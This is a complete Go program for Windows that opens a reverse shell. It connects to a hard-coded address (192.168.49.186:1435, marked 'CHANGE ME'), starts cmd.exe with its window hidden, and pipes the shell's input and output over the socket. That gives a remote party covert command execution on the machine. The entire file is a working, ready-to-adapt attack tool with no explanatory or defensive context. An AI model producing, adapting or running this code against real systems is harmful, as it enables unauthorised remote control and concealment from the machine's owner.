package main

import (
    "net"
    "os/exec"
    "syscall"
)

func main() {
    socket, _ := net.Dial("tcp", "192.168.49.186:1435") // CHANGE ME
    dagger := exec.Command("cmd.exe")
    dagger.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    dagger.Stdin = socket
    dagger.Stdout = socket
    dagger.Stderr = socket
    dagger.Run()
}
